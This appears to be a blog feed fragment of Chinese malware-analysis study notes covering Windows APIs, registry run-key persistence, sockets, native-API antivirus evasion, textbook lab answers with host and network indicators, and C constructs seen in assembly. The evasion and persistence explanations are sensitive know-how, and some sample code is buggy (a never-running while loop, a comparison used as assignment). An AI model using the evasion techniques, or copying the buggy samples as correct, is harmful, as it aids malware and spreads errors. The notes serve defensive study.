class="function">LPVOID WINAPI <span class="title">MapViewOfFile</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">　　__in HANDLE hFileMappingObject,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwDesiredAccess,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetHigh,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetLow,</span></span></div><div class="line"><span class="function"><span class="params">　　__in SIZE_T dwNumberOfBytesToMap</span></span></div><div class="line"><span class="function"><span class="params">　　)</span></span>;</div><div class="line"><span class="function">LPVOID WINAPI <span class="title">MapViewOfFileEx</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">　　__in HANDLE hFileMappingObject,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwDesiredAccess,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetHigh,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetLow,</span></span></div><div class="line"><span class="function"><span class="params">　　__in SIZE_T dwNumberOfBytesToMap,</span></span></div><div class="line"><span class="function"><span class="params">　　__in LPVOID lpBaseAddress</span></span></div><div class="line"><span class="function"><span class="params">　　)</span></span>;</div></pre></td></tr></table></figure></p><h3 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h3><p>Windows系统中有一些特殊文件类型，它们的访问方式与普通文件不太一样。恶意程序经常使用特殊文件。比如:一下特殊文件比普通文件更隐蔽，因为它们在列出目录时不会显示出来，某些特殊文件可以提取对系统硬件和内部数据更强的访问能力。</p><h2 id="Windows注册表"><a href="#Windows注册表" class="headerlink" title="Windows注册表"></a>Windows注册表</h2><p>Windows注册表被用来保存操作系统与程序配置信息，比如设置和选项，和文件系统一样，它是基于主机的感染迹象的很好来源，并且能够揭示出关于恶意代码功能的有用信息。Windows的早期版本使用.ini文件来保存配置信息。注册表被引入后，作为一个层次逐步提升。现在几乎所有的Windows配置信息都保存在注册表中，包括网络驱动，启动项，用户账户，以及其他信息。<br>恶意代码经常使用注册表来完成持久驻留或者存储配置数据。恶意代码添加项到注册表中，这使它在计算机引导时能够自动运行。</p><h3 id="你需要知道几个重要的注册表术语"><a href="#你需要知道几个重要的注册表术语" class="headerlink" title="你需要知道几个重要的注册表术语"></a>你需要知道几个重要的注册表术语</h3><p>根键: 注册表被划分为称为根键的5个顶层节。有时，术语HKEY和储巢也被使用。每一个跟键有一个特定的目的。<br>子键: 一个子键就像一个文件夹中的子文件夹<br>键: 一个键是一个注册表中的文件夹，它可以包含额外的文件夹或键值。跟健和子键都是键。<br>值项: 一个值项是一个配对的名字和值。<br>值或数据: 值或数据是存储在注册表项中的数据。</p><h3 id="注册表根键"><a href="#注册表根键" class="headerlink" title="注册表根键"></a>注册表根键</h3><p>注册表被划分成下面5个键:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">HEKY_LOCAL_MACHINE(HKLM) 保存对本地机器全局设置</div><div class="line">HEKY_CURRENT_USER(HKCU)  保存当前用户特定的设置</div><div class="line">HEKY_CLASSES_ROOT  保存定义的类型信息</div><div class="line">HEKY_CURRENT_CONFIG 保存关于当前硬件配置的设置</div><div class="line">HEKY_USERS 定义默认用户，新用户和当前用户的配置</div></pre></td></tr></table></figure></p><p>最常用的根键是HKLM和HKCU。</p><h3 id="注册表编辑器-Regedit"><a href="#注册表编辑器-Regedit" class="headerlink" title="注册表编辑器(Regedit)"></a>注册表编辑器(Regedit)</h3><p>注册表编辑器(Regedit)是windows内建的用来查看和编辑注册表的工具。</p><h3 id="自启动程序"><a href="#自启动程序" class="headerlink" title="自启动程序"></a>自启动程序</h3><p>向run子健中写入项，是一个普定设置程序自启动的方法，尽管不是一个隐蔽的技术，它任然经常被恶意代码用来自启动自身程序。(Autoruns工具可以使用)</p><h3 id="常用注册表函数"><a href="#常用注册表函数" class="headerlink" title="常用注册表函数"></a>常用注册表函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">RegOpenKeyEx 打开一个注册表进行编辑和查询(有些函数例外，大多数还是会使用的)。</div><div class="line">RegSetValueEx 添加一个新值到注册表，并设置它的数值。</div><div class="line">RegGetValue   返回注册表中一个值项的数值</div></pre></td></tr></table></figure><h2 id="网络API"><a href="#网络API" class="headerlink" title="网络API"></a>网络API</h2><h3 id="伯克利兼容套接字"><a href="#伯克利兼容套接字" class="headerlink" title="伯克利兼容套接字"></a>伯克利兼容套接字</h3><p>在Windows的网络选项中，恶意代码最普遍使用的是伯克利兼容套接字，在UNIX也是一样的。伯克利兼容套接字的网络功能在Windows系统中是由Winsock库实现的，主要在ws32_32.dll中，在所有库函数中，socket,connect,bind,listen,accept,send和recv函数最常用的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">socket创建一个套接字</div><div class="line">bind将一个套接字绑定到特定端口，应该在accept前调用</div><div class="line">listen准备着一个套接字将进入监听，等待入站连接</div><div class="line">accept向一个远程套接字打开一个连接，并接受连接</div><div class="line">connect向一个远程套接字打开一个连接，远程套接字必须在等待连接</div><div class="line">recv 从远程套接字接收数据</div><div class="line">send发送数据到远程套接字</div></pre></td></tr></table></figure></p><h2 id="跟踪恶意代码的运行"><a href="#跟踪恶意代码的运行" class="headerlink" title="跟踪恶意代码的运行"></a>跟踪恶意代码的运行</h2><h3 id="动态链接库-DLL"><a href="#动态链接库-DLL" class="headerlink" title="动态链接库(DLL)"></a>动态链接库(DLL)</h3><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件<br>恶意代码作者使用DLL的三种方式:</p><h4 id="保存恶意代码"><a href="#保存恶意代码" class="headerlink" title="保存恶意代码"></a>保存恶意代码</h4><p>有时候将恶意代码保存到一个DLL文件比exe文件更加有利。它可以附加到其他进程</p><h4 id="通过使用Windows-DLL"><a href="#通过使用Windows-DLL" class="headerlink" title="通过使用Windows DLL"></a>通过使用Windows DLL</h4><p>可以通过windows调用dll的程序</p><h4 id="通过使用第三方的DLL"><a href="#通过使用第三方的DLL" class="headerlink" title="通过使用第三方的DLL"></a>通过使用第三方的DLL</h4><p>因为是动态链接，所以可以使用第三方的DLL</p><h4 id="DLL的结构"><a href="#DLL的结构" class="headerlink" title="DLL的结构"></a>DLL的结构</h4><p>dll的文件结构几乎和exe文件一模一样，只有一个单一的标志指示这是dll。DLL经常有更多的导出函数，并且导入函数较少。</p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>恶意代码可以通过创建一个新的进程或修改一个已存在的进程，来执行恶意代码。<br>创建一个新的进程需要用到这个函数CreateProcess，下面是代码范例:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"> <span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(  </span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpApplicationName, <span class="comment">// 应用程序名称  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPTSTR lpCommandLine, <span class="comment">// 命令行字符串  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// 进程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// 线程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　BOOL bInheritHandles, <span class="comment">// 是否继承父进程的属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　DWORD dwCreationFlags, <span class="comment">// 创建标志  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPVOID lpEnvironment, <span class="comment">// 指向新的环境块的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpCurrentDirectory, <span class="comment">// 指向当前目录名的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSTARTUPINFO lpStartupInfo, <span class="comment">// 传递给新进程的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// 新进程返回的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>进程是执行代码的容器，线程才是Windows操作系统真正要执行的内容。<br>创建一个新的线程CreateThread</p><h3 id="使用互斥量-mutex-的进程间协作"><a href="#使用互斥量-mutex-的进程间协作" class="headerlink" title="使用互斥量(mutex)的进程间协作"></a>使用互斥量(mutex)的进程间协作</h3><p>互斥量是全局对象，用于协调多个进程和线程。主要用于控制共享资源的访问，并且经常被恶意代码使用(因为它们经常使用硬编码)。因为如果一个互斥量被两个不使用其它方式通讯的进程使用时，它的名字必须是互斥一致的。<br>一个互斥量可以通过CreateMutex函数进行创建，而进程可以通过OpenMutex调用来获取另一个进程中互斥量的句柄。线程通过一个对WaitForSingleObject的调用，获取对互斥量的访问，当一个线程完成对互斥量的使用后，需要使用ReleaseMutex</p><h2 id="内核与用户模式"><a href="#内核与用户模式" class="headerlink" title="内核与用户模式"></a>内核与用户模式</h2><p>Windows使用两种处理器特权级别:内核模式与用户模式。<br>依据处理器上执行的代码的类型，处理器在两个模式之间切换。应用程序在用户模式下执行。核心操作系统组件在内核模式下执行。多个驱动程序在内核模式下执行，但某些驱动程序在用户模式下执行。<br>用户模式：不能直接访问硬件，应用程序的虚拟地址空间除了为专用空间以外。还会受到限制。在用户模式下执行的处理器无法訪问为该操作系统保留的虚拟地址。限制用户模式应用程序的虚拟地址空间可防止应用程序更改而且可能损坏关键的操作系统数据。<br>内核模式: 内核模式下执行的全部代码都共享单个虚拟地址空间。这表示内核模式驱动程序未从其它驱动程序和操作系统自身独立开来。</p><h2 id="原生态API"><a href="#原生态API" class="headerlink" title="原生态API"></a>原生态API</h2><p>原生态API是用来和Windows进行交互的底层API,他们很少被非恶意软件使用，但是在恶意代码作者之间却很受欢迎。调用原生API函数可以绕过普通Windows API。<br>当调用Windows API中的一个函数时，这个函数通常不会直接执行请求的动作，因为大多数重要的数据结构都会被保存在内核中。这时用户程序被给予对用户API(如:DLL)的访问，这些DLL会调用ntdll.dll，这是一个特殊的DLL程序，它管理用户空间与内核的 交互。然后处理器却换到内核模式，并执行内核中的一个函数。这里ntdll函数像内核中的函数一样，使用API和结构体，这些函数组成了原生API。应用程序不建议调用原生API,但是操作系统中没有任何东西来阻止它们这样做。所有直接调用原生API对恶意代码作者来说很有吸引力，因为原生态API允许它们做一些采用别的方式不可能做到的事情，同时有时候很隐蔽(比如:一些反病毒软件是监控一个进程使用的系统调用，这里就可以躲避啦)。</p><h2 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h2><h3 id="这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行"><a href="#这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行" class="headerlink" title="这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行"></a>这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行</h3><p>发现两个函数:<br><img src="https://i.imgur.com/KkNhcak.png" alt=""><br>其中一个是StartServiceCtrlDispatcherA——&gt;在2000/XP等基于NT 的操作系统中，有一个服务管理器，它管理的后台进程被称为 service。在任务管理器中，并且随系统启动而最先运行，随系统关闭而最后停止。</p><h3 id="为什么程序会使用一个互斥量"><a href="#为什么程序会使用一个互斥量" class="headerlink" title="为什么程序会使用一个互斥量"></a>为什么程序会使用一个互斥量</h3><p>用于控制共享资源的访问</p><h3 id="可以用来检测这个程序的基于主机特征是什么？"><a href="#可以用来检测这个程序的基于主机特征是什么？" class="headerlink" title="可以用来检测这个程序的基于主机特征是什么？"></a>可以用来检测这个程序的基于主机特征是什么？</h3><p>使用Malservice与HGL345的互斥量，发现恶意域名:<a href="http://www.malwareanalysisbook.com" target="_blank" rel="external">http://www.malwareanalysisbook.com</a></p><h3 id="检测这个恶意代码基于网络特征是什么？"><a href="#检测这个恶意代码基于网络特征是什么？" class="headerlink" title="检测这个恶意代码基于网络特征是什么？"></a>检测这个恶意代码基于网络特征是什么？</h3><p>发现恶意域名:<a href="http://www.malwareanalysisbook.com。并且调用InternetOpenUrlA网络函数" target="_blank" rel="external">http://www.malwareanalysisbook.com。并且调用InternetOpenUrlA网络函数</a></p><h3 id="这个程序的目的是什么"><a href="#这个程序的目的是什么" class="headerlink" title="这个程序的目的是什么"></a>这个程序的目的是什么</h3><p>开机自启动，并且访问域名<a href="http://www.malwareanalysisbook，同时有WriteFile函数，可以写文件" target="_blank" rel="external">http://www.malwareanalysisbook，同时有WriteFile函数，可以写文件</a></p><h3 id="这个程序什么时候完成执行"><a href="#这个程序什么时候完成执行" class="headerlink" title="这个程序什么时候完成执行"></a>这个程序什么时候完成执行</h3><p>关机即结束</p><h1 id="API实战"><a href="#API实战" class="headerlink" title="API实战"></a>API实战</h1><h2 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h2><p>MessageBox指的是显示一个模态对话框<br>函数定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MessageBox</span><span class="params">(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType)</span></span>;</div><div class="line"></div><div class="line">hWnd：</div><div class="line">此参数代表消息框拥有的窗口。如果为<span class="literal">NULL</span>，则消息框没有拥有窗口。</div><div class="line">lpText：</div><div class="line">消息框的内容。如果使用了Unicode库，则把文本变成：  </div><div class="line">lpCaption：</div><div class="line">消息框的标题。如果使用了Unicode库，则把文本变成</div><div class="line">uType：</div><div class="line">指定一个决定对话框的内容和行为的位标志集。此参数可以为下列标志组中标志的组合。指定下列标志中的一个来显示消息框中的按钮以及图标。</div></pre></td></tr></table></figure></p><p>使用<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MessageBox(<span class="literal">NULL</span>,<span class="string">L"显示的字"</span>,<span class="string">L"标题"</span>,MB_RETRYCANCEL);<span class="comment">//L宏来传递字符串   MB_RETRYCANCEL按钮数量</span></div></pre></td></tr></table></figure></p><h2 id="GetWindowText"><a href="#GetWindowText" class="headerlink" title="GetWindowText"></a>GetWindowText</h2><p>Windows API宏，在WinUser.h中根据是否已定义Unicode被分别定义为GetWindowTextW和GetWindowTextA。该函数将指定窗口的标题条文本（如果存在）拷贝到一个缓存区内。如果指定的窗口是一个控件，则拷贝控件的文本。<br>函数定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">Int <span class="title">GetWindowText</span><span class="params">(HWND hWnd,LPTSTR lpString,Int nMaxCount)</span></span>;</div><div class="line"></div><div class="line"></div><div class="line">GetWindowText(</div><div class="line">  hWnd: HWND;        &#123;窗口句柄&#125;</div><div class="line">  lpString: PChar;   &#123;接收文本的缓冲区的指针&#125;</div><div class="line">  nMaxCount: Integer &#123;指定缓冲区大小, 其中包含<span class="literal">NULL</span>字符; 如果文本超出，会被被截断&#125;</div><div class="line">): Integer;          &#123;返回字符个数, 不包括中断的空字符; 如果标题为空或句柄无效, 则返回零&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;多数恶意代码以Windows平台为目标，并且与操作系统进行紧密交互。对基本Windoows编程概念的深刻理解会帮助你识别出恶意代码在主机上的感染迹象，跟踪恶意代码的执行(因为它们可能使用操作系统来执行代码而不是用一个跳转或调用指令)，并最终分析出恶意代码的目的。&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析———识别汇编中的C代码结构</title>
    <link href="http://yoursite.com/2018/04/25/re_14_evil_2/"/>
    <id>http://yoursite.com/2018/04/25/re_14_evil_2/</id>
    <published>2018-04-25T00:49:18.000Z</published>
    <updated>2018-05-15T00:35:14.215Z</updated>
    
    <content type="html"><![CDATA[<p>C语言是最基础的高级编程语言，许多恶意代码都是有C编写的<br><a id="more"></a></p><h1 id="识别汇编中的C代码结构"><a href="#识别汇编中的C代码结构" class="headerlink" title="识别汇编中的C代码结构"></a>识别汇编中的C代码结构</h1><h2 id="全局与局部变量"><a href="#全局与局部变量" class="headerlink" title="全局与局部变量"></a>全局与局部变量</h2><p>全局变量可以被一个程序中的任意函数访问和使用，局部变量只能在它被定义的函数中访问和使用.例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">int x=1, y=3;</div><div class="line">void main()</div><div class="line">&#123;</div><div class="line">x = x + y;</div><div class="line">printf(&quot;Total = %d\n&quot;,x);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>与<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">void main()</div><div class="line">&#123;</div><div class="line">int x = 1, y = 3;</div><div class="line">x = x + y;</div><div class="line">printf(&quot;Total = %d\n&quot;,x);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>汇编结构:<br><img src="https://i.imgur.com/YA5gXPl.png" alt=""><br>全局变量通过内存地址引用，而局部变量通过栈地址引用.</p><h2 id="各种结构体"><a href="#各种结构体" class="headerlink" title="各种结构体"></a>各种结构体</h2><h3 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> x = <span class="number">1</span>, y = <span class="number">3</span>,x1=<span class="number">0</span>,y1=<span class="number">2</span>;</div><div class="line"><span class="keyword">if</span> (x==y) &#123;</div><div class="line"><span class="keyword">if</span>(y1==x1)&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"y == x\n and y1==x1\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"y == x and y1!=x1\n"</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"><span class="keyword">if</span> (y1==x1) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"y1== x1 and x!=y\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"y1!= x1 and  x!=y\n"</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/d7WvAra.png" alt=""><br>视图<br><img src="https://i.imgur.com/Asu0roV.png" alt=""><br>逻辑是一样的，判断后跳转</p><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"><span class="keyword">switch</span> (i) </div><div class="line">&#123;</div><div class="line"><span class="keyword">case</span> <span class="number">1</span>: </div><div class="line"><span class="built_in">printf</span>(<span class="string">"i == 1"</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> <span class="number">2</span>:</div><div class="line"><span class="built_in">printf</span>(<span class="string">"i == 2"</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> <span class="number">3</span>:</div><div class="line"><span class="built_in">printf</span>(<span class="string">"i == 3"</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/eMvkfsC.png" alt=""><br>视图<br><img src="https://i.imgur.com/ziZzHE1.png" alt=""></p><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"i equals %d\n"</span>,i);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/m5UeIjS.png" alt=""></p><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span>(i&gt;<span class="number">10</span>)&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"i equals %d\n"</span>,i);</div><div class="line">i++;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/FHPnkmN.png" alt=""></p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="keyword">int</span> b[<span class="number">5</span>] = &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> a[<span class="number">5</span>];</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</div><div class="line">&#123;</div><div class="line">a[i] = i;</div><div class="line">b[i] = i;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/3YdJPOu.png" alt=""><br>视图</p><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> &#123;</span></div><div class="line"><span class="keyword">int</span> x[<span class="number">5</span>];</div><div class="line"><span class="keyword">char</span> y;</div><div class="line"><span class="keyword">double</span> z;</div><div class="line">&#125;;</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> *<span class="title">gms</span>;</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(struct my_struct *q)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line">q-&gt;y = <span class="string">'a'</span>;</div><div class="line">q-&gt;z = <span class="number">15.6</span>;</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</div><div class="line">&#123;</div><div class="line">q-&gt;x[i] = i;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">gms = (struct my_struct *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct my_struct));</div><div class="line">test(gms);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/8L4rj5o.png" alt=""></p><h3 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></div><div class="line"><span class="keyword">int</span> x;</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></div><div class="line">&#125;;</div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">pnode</span>;</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">pnode *curr, *head;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line">head = <span class="literal">NULL</span>;</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">10</span>;i++)</div><div class="line">&#123;</div><div class="line">curr = (pnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(pnode));</div><div class="line">curr-&gt;x = i;</div><div class="line">curr-&gt;next = head;</div><div class="line">head = curr;</div><div class="line">&#125;</div><div class="line">curr = head;</div><div class="line"><span class="keyword">while</span> (curr)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,curr-&gt;x);</div><div class="line">curr == curr-&gt;next;</div><div class="line">&#125;</div><div 